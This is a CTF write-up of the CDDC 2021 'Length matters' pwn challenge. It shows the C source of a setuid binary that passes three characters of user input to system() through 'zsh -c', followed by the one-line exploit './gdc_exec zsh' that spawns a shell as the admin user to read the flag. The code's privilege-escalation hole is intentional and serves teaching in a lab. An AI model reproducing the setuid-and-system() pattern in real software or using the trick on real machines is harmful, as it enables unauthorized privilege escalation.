## [Up 1 directory](../CDDC_2021.md)
  
# File it Away  
This is a set of pwn challenges hosted during CDDC 2021.
  
The only challenge documented here will be "Length matters", as the other solved challenge  
did not have a provided binary and the target server has since been shut down. This challenge  
is super simple, almost braindead but it took me slightly longer than expected to solve due  
to overthinking.
  
## Mounting
### Points: 200
### Challenge text:
(forgot, but the IP and port was provided.)
  
### Solution
The first step was to connect to the IP and port over netcat. This drops us into a linux  
shell. The following files were accessible:
  
```
ls
flag  gdc_exec  gdc.c
```  
The gdc_exec binary was owned by the user "admin" and had the setuid bit set. The contents  
of gdc.c are shown here:  
  
```c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>


int main(int argc, char *argv[])
{
        char command[50];
        char pref[] = "zsh -c ";

        if (argc == 1) return 0;

        bzero(command, 50);
        strcpy(command, pref);

        strncpy(command + strlen(command), argv[1], 3);

        setreuid(geteuid(), geteuid());

        system(command);

        return 0;
}
```
  
This is the source code for the gdc_exec binary. It checks the length of argv[1] and  
concatenates it to 3 characters. It then executes it with zsh. The simplest solution to  
this is to pass "zsh" as the argument, since this uses zsh to spawn a zsh shell with the  
effective uid of the "admin" user (due to the setuid bit on gdc_exec).
  
This was replicated in my local machine for the purpose of this writeup. The original flag  
was not documented :C.
  
```
# 
# ./gdc_exec zsh
➜  Desktop cat flag
CDDC21{test flag}
➜  Desktop 
```